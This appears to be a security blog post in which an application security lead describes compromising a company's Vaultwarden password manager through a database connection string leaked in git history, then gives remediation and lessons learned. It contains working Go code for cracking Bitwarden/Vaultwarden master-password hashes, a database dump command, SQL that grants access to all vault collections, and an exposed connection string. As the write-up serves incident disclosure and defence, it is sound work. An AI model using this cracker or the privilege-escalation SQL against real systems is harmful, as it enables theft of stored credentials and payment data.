---
title: From read-only access to compromising a company's password manager
layout: post
permalink: /from-read-only-access-to-compromising-a-company's-password-manager
---

# Introduction

This is a story of how I managed to go from a read-only access to a repository to compromising a company's password manager. Although not really complex both technically and logically, it shows (I hope) how small mistakes, innocent at first glance misconfigurations accumulate over time and can lead to security incidents with critical impact.

Also, it is an example of how managing internal threat is crucial, since you can never fully know who you are employing or be sure that their moral compass will remain on the right side.

Last but not least, it proves that the security principles exist for reasons other than just theories and paranoia and once our "theoretical" threats materialize, they could be fatal and resolving them is often a really hard job.

**Disclaimer:** *Since full disclosure can harm the company's reputation even after the incident is resolved, all data related to the company and its employees is heavily obfuscated.*

Earlier this year I joined a start-up company to lead the Application Security team, which for the timeline of this story continued to be comprised of, well, only me.

After the standard on-boarding, there was a briefing about the current state of the company and the main pain points for security:
- Lack of development and security processes
- No security in CI/CD pipelines
- Cases/suspicions involving employees stealing or intentionally leaking trade secrets and code
- A semi-successful phishing campaign almost giving access to the Version Control System (VCS) to attackers
- People joining from competing companies with the only intention of corporate espionage

With all of these in mind, I started looking around, getting familiar with the code-base.

# Secret Detection

In that period, in my spare time I was reading "How to hack like a ghost" by Sparc Flow (which I highly recommend, his writing style and the content of the book is a gem). In the book he briefly mentions how to quickly check code for hard-coded secrets which are some of the lowest hanging fruit for an attacker. In my time as a developer, I was not used to hard-coded plain-text passwords, we used either vaults or encrypted property files.

The first step was using GitHub's search functionality and basic keywords which returned some concerning results. I was also given read-only access to all repositories in an internal GitLab instance, so I cloned them locally and ran the following command (as taught by Sparc Flow in the book):

{% highlight bash %}
git rev-list --all | xargs git grep 'keyword'
{% endhighlight %}

There were many concerning results which was another indication this process will take a while. I decided to drop the bash scripting and go for an official tool for this purpose - Gitleaks. I picked it up because at the time it was the most recent and actively developed tool for secret detection and after months of experience with it I cannot recommend it enough.

The Gitleaks findings were devastating - the secrets were not only all over the place, there was a variety of different types and worst of all - many, many, still active ones. Private keys, certificates, version control system tokens, passwords and connection strings were everywhere. Most of them were obfuscated, deleted or encrypted but only in the latest version of the code, without revoking the actual value that was "once" exposed in previous commits, as you can see from the following example:

|![](/assets/bitwarden/images/image_1_git_commits.png)| 
|:--:|
|*Image 1: A file containing a secret in plain-text was later deleted*|


The above commits are related to one finding that is the main focus of this article - a connection string to a PostgreSQL database with the database name - "bitwarden":

{% highlight bash %}
psql postgresql://bitwardenuser:Bi64AJpQDy12w@common-psql.===================.rds.amazonaws.com:5432/bitwarden
{% endhighlight %}

|![](/assets/bitwarden/images/image_2_bitwarden_yaml.png)|
|:--:| 
|*Image 2: A configuration file containing a PostgreSQL connection string, an admin token and SMTP credentials for a Bitwarden/Vaultwarden instance*|

At the time the company was using this "Bitwarden" instance as the company wide password manager. However, a colleague of mine pointed out a small-print detail on the front-end app:

|![](/assets/bitwarden/images/image_3_powered_by_vaultwarden.png)|
|:--:| 
|*Image 3: Powered by Vaultwarden*|

As it turned out, the company is actually using "Vaultwarden" which is, as per its official documentation - "a self-hosted, unofficial Bitwarden compatible server written in Rust" and is not owned by the company behind Bitwarden (regardless of the app mentioning Bitwarden Inc.).

**Disclaimer:** _The compromise described in the following sections is not related/caused by a vulnerability in either Bitwarden or the Vaultwarden alternative. It is a chain of misconfigurations and missing security controls. The collections functionality described below is working as intended and as documented, the official Bitwarden documentation clearly states that collections are shared within all users in a given organization. The intent of this article is not to discourage anyone from using both password managers or to diminish their reputation and level of security. On the contrary, the purpose is to show that good encryption and a good password manager are only as good as how you configure and manage them._

# DB Access

I installed a psql client and tested the connection string and it worked, the only existing protection was the company VPN, which all employees were connecting to. 

|![](/assets/bitwarden/images/image_4_bitwarden_tables.png)|
|:--:| 
|*Image 4: Bitwarden/Vaultwarden database tables*|

The first thing to check was the users table which presented the users' password hashes and password hints:

|![](/assets/bitwarden/images/image_5_bitwarden_users_table.png)|
|:--:| 
|*Image 5: Bitwarden/Vaultwarden users table containing email, password_hash, salt, password_hint and iterations*|

I immediately contacted the team managing the instance - DevOps, to alert of the secret and the access to the database. The response was along the lines of "so what if you have access to the hashes", "only a limited number of employees have access to the repository" and overall that this is not a problem.

After some back and forth of me trying to explain the potential risk and impact of the current situation, we finally agreed that the password would be revoked and network rules would be implemented to limit the access to the database only to admins, not everyone on the VPN. I had to accept that my finding is not so critical for the time being. 

A month later, the internal ticket for changing the database password was still untouched. In a second attempt to escalate this, I logged into the database with the good old connection string. After looking around at the different tables, columns and relations between them I decided to dump the database and to analyse it locally.

{% highlight bash %}
pg_dumpall -h <ip> -p 5433 -U bitwardenuser -W -f backup.sql
{% endhighlight %}

This command created a dump of the whole database and stored it in a simple SQL file with all the create table and insert statements.
The following commands restore the database into a local instance and run Vaultwarden:

{% highlight bash %}
# Pull PostgreSQL docker image
sudo docker pull postgres:13.7

# Start PostgreSQL
sudo docker run --name postgres -p 5432:5432 -e POSTGRES_PASSWORD=${password} -d postgres:13.7
{% raw %}
# Get PostgreSQL IP address
sudo docker inspect -f '{{range.NetworkSettings.Networks}} {{.IPAddress}}{{end}}' postgres 
{% endraw %}
# Login
psql -U postgres -h <ip>
{% endhighlight %}

{% highlight sql%}
-- Create an empty database with the name "bitwarden" (same as in the backup)
CREATE DATABASE bitwarden;

-- Grant all privileges to current user
GRANT all privileges ON database bitwarden TO postgres;
{% endhighlight %}


{% highlight bash%}
# Restore the database
psql -U postgres -h <ip> bitwarden < backup.sql

# Pull Vaultwarden image
sudo docker pull vaultwarden:latest

# Start Vaultwarden with the restored database on port 80
sudo docker run --name vaultwarden -v /vw-data/:/data/ -p 80:80 -e 'DATABASE_URL=postgresql://postgres:${password}@172.17.0.2:5432/bitwarden' -d vaultwarden/server:latest
{% endhighlight %}

With a local copy of both the database and the Vaultwarden application, further testing could be done without concerns of messing up the data or taking down the live application.

# Vaultwarden/Bitwarden algorithm & hash cracking

With access to my own password hash in the database and knowing the actual password, the next step was to research whether a successful recreation of the hashing algorithm is possible to try and crack other users' master passwords.

The official Bitwarden documentation presents the following diagram on the usage of the master password:

|![](/assets/bitwarden/images/image_6_bitwarden_diagram.png)|
|:--:| 
|*Image 6: Diagram of Bitwarden master password algorithm*|

The Vaultwarden/Bitwarden algorithm implements a Password Based Key Derivation Function 2 (PBKDF2) using a one-way hash function (HMAC-SHA-256) with different numbers of iterations. The hash that is stored in the database is calculated by:

1. The master password is salted with the email and hashed with 100 000 iterations
2. The resulting hash is salted with the master password and hashed once
3. The result of step 2 is then passed to the Bitwarden server where it is salted with a random salt (stored in the db) and hashed another 100 000 times

**Note:** *The iteration count is configurable both on an instance and user level, by default it's 100 000. None of the target users had a different iteration count set up.*

Both of the projects are open-source which made the task a little easier, however, I had no experience with Rust (Vaultwarden) and had not touched C# (Bitwarden) in a very long time, so I went with the above diagram and replicated it in GO:

{% highlight go %}
package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"encoding/csv"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"golang.org/x/crypto/pbkdf2"
)

const hexPrefix = "\\x"

type User struct {
	Email            string
	Salt             string
	Hash             string
	ClientIterations int
	ServerIterations int
}

/*
*	FOR RESEARCH, EDUCATION & DEMONSTRATION PURPOSES ONLY.
*	DO NOT USE FOR MALICIOUS PURPOSES OR WITHOUT PERMISSION.
*	The following code is ONLY for demo purposes.
*	For actual hash cracking it could be heavily optimized.
 */
func main() {
	targetsPath := os.Args[1]
	wordlist := os.Args[2]
	users := parseCSV(targetsPath)
	passwords := parseWordlist(wordlist)

	for _, user := range users {
		for _, password := range passwords {
			if crack(user.Email, password, user.Salt, user.Hash, user.ClientIterations, user.ServerIterations) {
				fmt.Printf("Found! Email: %s, Password: %s\n", user.Email, password)
				break
			}
		}
	}
}

func crack(email string, password string, salt string, hash string, clientIterations int, serverIterations int) bool {
	// hxxps[://]bitwarden[.]com/help/bitwarden-security-white-paper/

	// Client part
	masterPassword := []byte(password)
	clientSalt := []byte(email)
	masterKey := pbkdf2.Key(masterPassword, clientSalt, clientIterations, 32, sha256.New)
	rawMasterPasswordHash := pbkdf2.Key(masterKey, masterPassword, 1, 32, sha256.New)
	clientBase64Hash := base64.StdEncoding.EncodeToString(rawMasterPasswordHash)

	// Server part
	serverSalt, _ := hex.DecodeString(salt)
	rawServerPasswordHash := pbkdf2.Key([]byte(clientBase64Hash), serverSalt, serverIterations, 32, sha256.New)
	hexServerPasswordHash := hex.EncodeToString(rawServerPasswordHash)

	return hexServerPasswordHash == hash
}

func parseCSV(path string) []User {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("failed to open %s\n", path)
	}
	defer file.Close()

	lines, err := csv.NewReader(file).ReadAll()
	if err != nil {
		log.Fatalf("failed to read csv %s\n", path)
	}

	var users []User
	for _, line := range lines {
		var user User
		user.Email = line[0]
		user.Salt = parseHex(line[1])
		user.Hash = parseHex(line[2])
		user.ClientIterations, _ = strconv.Atoi(line[3])
		user.ServerIterations, _ = strconv.Atoi(line[4])
		users = append(users, user)
	}
	return users
}

func parseWordlist(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("failed to open %s\n", path)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var wordlist []string
	for scanner.Scan() {
		wordlist = append(wordlist, scanner.Text())
	}
	return wordlist
}

func parseHex(raw string) string {
	if strings.HasPrefix(raw, hexPrefix) {
		raw = strings.Replace(raw, hexPrefix, "", 1)
	}
	return raw
}
{% endhighlight %}
***Note:*** *The actual cracking was done with each email and word list processed in parallel.*

I extracted the necessary fields from the users table into a csv file:

{% highlight bash %}
```
psql -U postgres -h 172.17.0.2 bitwarden --csv -t -c "select email, salt, password_hash, client_kdf_iter, password_iterations from users;" -o targets.csv
```
{% endhighlight %}
And then ran it against different word lists:
{% highlight bash %}
```
go build bitwarden.go
./bitwarden targets.csv wordlist
```
{% endhighlight %}

After running several common password lists to no success, I moved on to doing OSINT on the targets. In combination with some information about the company I generated custom word-lists (using tools like cewl, crunch, cupp, mentalist, johntheripper) and after a few days I managed to crack the password for one of the users:

|![](/assets/bitwarden/images/image_7_cracked_hash_1.png)
|:--:| 
|*Image 7: Successfully cracked hash 1*|

And a few hours later another one:

|![](/assets/bitwarden/images/image_8_cracked_hash_2.png)|
|:--:| 
|*Image 8: Successfully cracked hash 2*|

One of these accounts was actually empty, the other revealed some passwords, but at the time of cracking them, they were already shadowed by the outcome of the following section.

# Privilege escalation

The hash cracking exercise described above took a few days and while it was running, I explored several other ways to gain access to passwords by messing up with both the actual application and the database:

- Updating the hash of another user with a hash I know the password for - resulted in successful login as the other user, but all vault items were shown with an decryption error (after removing some db unique key constraints)
- Taking over an account as in the previous step and inviting myself in the organizations of the victim account. The invite needs to be confirmed and it gets signed with the actual master password of the account that initiates the invite - so a wrong password in this case (the one from the hash I inserted)
- Moving items from an inaccessible collection to a one I am part of
- Creating a new organization and copying passwords to it


All of the above attempts failed, due to fact that all of these operations involve encrypting/signing keys with the actual master password of the user that is performing the operation.
They resulted in partial access to screens in the front-end and performing some actions on behalf of other users, but all password/item related screens just showed a decryption error.
I could see how many items are in a given collection but only that, none of the names of the entries or the actual values.

|![](/assets/bitwarden/images/image_9_decryption_error.png)|
|:--:| 
|*Image 9: Vault item decryption error*|

## Collections

Bitwarden/Vaultwarden provides the users with the option to group and share passwords in so called Collections.

The next thing I tried was to insert my user into other collections through the database:

```sql
-- This returns all the IDs of the collections
bitwarden=> select collection_uuid from users_collections;

-- Adding my user to a given collection
bitwarden=> insert into users_collections (user_uuid, collection_uuid, read_only, hide_passwords)  
values ('2c81650a-e7f3-159d-b2e8-9a1245d3a007','19243a26-86f1-0d3c-573d-8a6c2107f2da', false, false);
```

After iterating all collections, my vault homepage went from this:

|![](/assets/bitwarden/images/image_10_initial_collections.png)|
|:--:| 
|*Image 10: Initial collections*|

To multiple collections:

|![](/assets/bitwarden/images/image_11_additional_collections.png)
|:--:| 
|*Image 11: Getting access to additional collections*|

Each of the new collections had entries that were previously inaccessible. This definitely showed that collections are a way to get access to items I should not have.

However, before exploring the entries in more detail I looked at the database once more to see why I could not join organizations, but I could insert my account into collections. This is when I came across what turned out to be the big "Open Sesame" moment:

|![](/assets/bitwarden/images/image_12_access_all_flag.png)|
|:--:| 
|*Image 12: Access all flag in users_organizations table*|

Within the company organization I had the "Access All" flag set to False. I quickly updated it to True:

```sql
bitwarden=> update users_organizations set access_all = 't' where user_uuid = '2c81650a-e7f3-159d-b2e8-9a1245d3a007';
```

I went back to the Bitwarden/Vaultwarden front-end in the browser and was prompted to unlock my account:

|![](/assets/bitwarden/images/image_13_password_prompt.png)|
|:--:| 
|*Image 13: Bitwarden/Vaultwarden prompt for master password*|

After than my Vault homepage went from this: 

|![](/assets/bitwarden/images/image_14_vault_items_before_compromise.png)|
|:--:| 
|*Image 14: Initial vault items before access_all modification*|

To:

|![](/assets/bitwarden/images/image_15_compromised_vault_items_1.png)|
|:--:| 
|*Image 15: Compromised vault items 1*|

|![](/assets/bitwarden/images/image_16_compromised_vault_items_2.png)|
|:--:| 
|*Image 16: Compromised vault items 2*|

|![](/assets/bitwarden/images/image_17_compromised_vault_items_3.png)|
|:--:| 
|*Image 17: Compromised vault items 3*|

|![](/assets/bitwarden/images/image_18_compromised_vault_items_4.png)|
|:--:| 
|*Image 18: Compromised vault items 4*|

|![](/assets/bitwarden/images/image_19_compromised_vault_items_5.png)|
|:--:| 
|*Image 19: Compromised vault items 5*|

|![](/assets/bitwarden/images/image_20_compromised_vault_items_6.png)|
|:--:| 
|*Image 20: Compromised vault items 6*|

|![](/assets/bitwarden/images/image_21_compromised_vault_items_7.png)|
|:--:| 
|*Image 21: Compromised vault items 7*|

|![](/assets/bitwarden/images/image_22_compromised_vault_items_8.png)|
|:--:| 
|*Image 22: Compromised vault items 8*|

|![](/assets/bitwarden/images/image_23_compromised_vault_items_9.png)|
|:--:| 
|*Image 23: Compromised vault items 9*|

|![](/assets/bitwarden/images/image_24_compromised_vault_items_10.png)|
|:--:| 
|*Image 24: Compromised vault items 10*|

## Assessing the loot

All the vault items from all the collections that were part of the company's organization were revealed to me.
As seen in the screenshots, the list ranged from:

- Individual accounts to some of the systems the company is using
- Access credentials to a data center customer portal
- Production cloud accounts
- Finance and accounting platforms
- HR and recruitment platforms
- Credit card details
- Many other systems

The details of the vault items were fully visible (although some of them required to re-enter my master password):

|![](/assets/bitwarden/images/image_25_aws_id_and_secret.png)|
|:--:| 
|*Image 25: AWS ID & Secret*|

|![](/assets/bitwarden/images/image_26_aws_account_credentials_prod.png)|
|:--:| 
|*Image 26: AWS account credentials (Production)*|

|![](/assets/bitwarden/images/image_27_mastercard_1.png)|
|:--:| 
|*Image 27: Mastercard 1*|

|![](/assets/bitwarden/images/image_28_mastercard_2.png)|
|:--:| 
|*Image 28: Mastercard 2*|

|![](/assets/bitwarden/images/image_29_mastercard_3.png)|
|:--:| 
|*Image 29: Mastercard 3*|

|![](/assets/bitwarden/images/image_30_datacenter_customer_portal_1.png)|
|:--:| 
|*Image 30: Data center customer portal credentials 1*|

|![](/assets/bitwarden/images/image_31_datacenter_customer_portal_2.png)|
|:--:| 
|*Image 31: Data center customer portal credentials 2*|

|![](/assets/bitwarden/images/image_32_cloudflare_credentials.png)|
|:--:| 
|*Image 32: Cloudflare credentials*|

There were additional individual users' passwords which were not shared in a collection, therefore not compromised by this technique. They could only be accessed by logging into their accounts, for which the above described hash cracking can be used.

# Datadog

Although successful in my compromise, to this point I could still recall the previous arguments "but only a few people have access to this repository", "it's not that big of a deal" and others.
During the initial stages of my testing I checked whether I can use the Bitwarden/Vaultwarden machine for pivoting to other hosts on the network.

One of the systems I used for additional information was Datadog (a monitoring platform). I went back to Datadog, searched for the bitwarden/vaultwarden instance and started looking at the different screens related to it. One of them (fairly new at the time) was about monitoring Kubernetes clusters and pods (as you can see from bitwarden.yaml from *Image 2* Kubernetes was used for deployment).
After a while I stumbled upon a tab labeled "YAML" only to see the exact same bitwarden.yaml without any of the passwords obfuscated!
I swiftly checked out my profile to see whether I have admin rights to be able to see so much information only to realize that (once again) I had read-only access.

This was the cherry on the cake, since all technical staff had access to Datadog and they either had the same or even higher permissions, which meant ALL of them could go to this tab, see the database password and achieve the same compromise of the password manager of the company. This allowed me to trigger the incident response procedure and any excuse/pushback was no longer valid.

# Resolution & Lessons learned

The immediate actions taken to resolve the incident were as follows.

Technical:
- Migrate the PostgreSQL database to a separate machine (it was initially the same one where the front-end app was deployed).
- Modify the network rules so that only a specific VPN group has access to the database machine for maintenance purposes.
- Cut off external internet access of the Vaultwarden machine, to avoid a supply chain attack in case the project gets compromised and starts sending plain-text passwords home.
- Disable the Kubernetes monitoring in Datadog (the monitoring was already setup in another platform). Additionally, obfuscation of such sensitive information could be controlled via regular expressions.

Organizational:
- Split the current organization within Vaultwarden into multiple ones (one for each previous collection, a.k.a department).
- Migrate the passwords from the current collections to the newly created organizations.
- Migrate the users of the previous big organization to the newly department-based organizations. This involved sending email invites to all employees.
- Training sessions with each department on the new setup and to instruct them to change each password in the respective systems.
- Deleting the old organization and collections.

This new setup ensured that if any user somehow gets access to the database or finds a privilege escalation point within the app, they could only get access to the vault items that are already shared with them. Access to any other organization or its items meant they need to be officially invited, otherwise items cannot be successfully decrypted.

Lessons learned:
- Setting up company applications, especially of such importance as a password manager should be done with great caution and security in mind
- Internal threat is not only theoretical and in the books
- GIT never forgets! There are ways to make it forget, but re-writing history is against the whole concept of it. It is best to keep good hygiene and avoid hard-coding sensitive data in the first place.
- The layered security models should not be neglected, small issues can pile up and lead to really big ones. Proper access management and controls on both application and network level could have prevented this compromise, even with the other misconfigurations and logical weaknesses.
- Given enough time brute-forcing/hash-cracking is possible, although much more complicated and tedious (for an attacker) and not like in the movies
- Read-only access should not be automatically discarded as not a risk.

# References:

- Sparc Flow's website: `hxxps[://]www[.]sparcflow[.]com/about/`
- "How to hack like a ghost" book: `hxxps[://]nostarch[.]com/how-hack-ghost`
- Gitleaks - `hxxps[://]github[.]com/gitleaks/gitleaks`
- Bitwarden algorithm - `hxxps[://]bitwarden[.]com/help/bitwarden-security-white-paper/`
- Vaultwarden - `hxxps[://]github[.]com/dani-garcia/vaultwarden`
- Datadog - `hxxps[://]www[.]datadoghq[.]com/`
